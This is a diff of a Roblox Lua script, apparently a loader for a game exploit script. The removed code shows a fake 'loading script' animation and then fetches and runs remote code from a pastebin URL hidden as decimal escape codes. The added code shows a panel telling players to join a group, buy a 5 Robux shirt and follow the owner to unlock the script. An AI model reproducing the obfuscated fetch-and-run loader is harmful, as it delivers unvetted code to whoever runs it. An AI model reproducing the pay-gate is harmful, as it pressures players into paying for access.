@@ -1,90 +1,44 @@
-local A = game:GetService("Players")
-local B = game:GetService("TweenService")
-local C = A.LocalPlayer
-local D = Instance.new("ScreenGui", C:WaitForChild("PlayerGui"))
-D.Name = "XxGui_"..math.random(1000,9999)
-D.IgnoreGuiInset = true
-D.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-D.ResetOnSpawn = false
 
-local E = Instance.new("Frame", D)
-E.BackgroundColor3 = Color3.new(0, 0, 0)
-E.Size = UDim2.new(0, 0, 0, 0)
-E.Position = UDim2.new(0.5, 0, 0.5, 0)
-E.AnchorPoint = Vector2.new(0.5, 0.5)
-E.BorderSizePixel = 0
-Instance.new("UICorner", E).CornerRadius = UDim.new(0, 12)
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ECSWarningGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
-B:Create(E, TweenInfo.new(1), {
-	Size = UDim2.new(0, 320, 0, 120)
-}):Play()
-task.wait(1)
 
-local F = Instance.new("ImageLabel", E)
-F.Size = UDim2.new(0, 50, 0, 50)
-F.Position = UDim2.new(0, 10, 0, 10)
-F.BackgroundTransparency = 1
-F.Image = "rbxthumb://type=Asset&id=135724188612525&w=420&h=420"
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 400, 0, 220)
+frame.Position = UDim2.new(0.5, -200, 0.5, -110)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
 
-local G = Instance.new("TextLabel", E)
-G.Size = UDim2.new(0, 240, 0, 40)
-G.Position = UDim2.new(0, 70, 0, 15)
-G.BackgroundTransparency = 1
-G.Font = Enum.Font.GothamBlack
-G.TextSize = 22
-G.TextColor3 = Color3.new(1, 1, 1)
-G.Text = "loading script"
 
-local H = Instance.new("Frame", E)
-H.Size = UDim2.new(0, 280, 0, 8)
-H.Position = UDim2.new(0.5, -140, 1, -25)
-H.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-H.BorderSizePixel = 0
-Instance.new("UICorner", H).CornerRadius = UDim.new(0, 4)
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 15)
+corner.Parent = frame
 
-local I = Instance.new("Frame", H)
-I.Size = UDim2.new(0, 0, 1, 0)
-I.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
-I.BorderSizePixel = 0
-Instance.new("UICorner", I).CornerRadius = UDim.new(0, 4)
 
-B:Create(I, TweenInfo.new(7), {
-	Size = UDim2.new(1, 0, 1, 0)
-}):Play()
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "You Have Not Bought The ECS Shirt ❌️"
+title.TextColor3 = Color3.new(1, 0.2, 0.2)
+title.TextSize = 20
+title.Font = Enum.Font.GothamBlack
+title.TextWrapped = true
+title.Parent = frame
 
-local J = { "", ".", "..", "..." }
-task.spawn(function()
-	local K = 1
-	while D.Parent do
-		G.Text = "loading script" .. J[K]
-		K = (K % #J) + 1
-		task.wait(0.3)
-	end
-end)
 
-task.delay(7, function()
-	B:Create(F, TweenInfo.new(0.7), {
-		ImageTransparency = 1,
-		Position = UDim2.new(0.5, -25, 0.5, -25),
-		Size = UDim2.new(0, 0, 0, 0)
-	}):Play()
-
-	B:Create(G, TweenInfo.new(0.7), {
-		TextTransparency = 1,
-		Position = UDim2.new(0.5, 0, 0.5, 0),
-		Size = UDim2.new(0, 0, 0, 0)
-	}):Play()
-
-	B:Create(H, TweenInfo.new(0.7), { BackgroundTransparency = 1 }):Play()
-	B:Create(I, TweenInfo.new(0.7), { BackgroundTransparency = 1 }):Play()
-
-	task.wait(0.7)
-	B:Create(E, TweenInfo.new(0.5), {
-		Size = UDim2.new(0, 0, 0, 0)
-	}):Play()
-
-	task.wait(0.5)
-	D:Destroy()
-
-	loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\119\97\70\120\77\109\74\56"))()
-end)
+local desc = Instance.new("TextLabel")
+desc.Size = UDim2.new(1, -20, 0, 150)
+desc.Position = UDim2.new(0, 10, 0, 60)
+desc.BackgroundTransparency = 1
+desc.TextColor3 = Color3.new(1, 1, 1)
+desc.TextSize = 16
+desc.TextWrapped = true
+desc.Font = Enum.Font.GothamBlack
+desc.Text = "To use the script, you must:\n1. Join the group: we love purecuteboy\n2. Go to the Store and buy the 5 Robux shirt\n3. Follow the owner of the group\n\nAfter this, you'll get full access ✅️"
+desc.TextXAlignment = Enum.TextXAlignment.Left
+desc.TextYAlignment = Enum.TextYAlignment.Top
+desc.Parent = frame
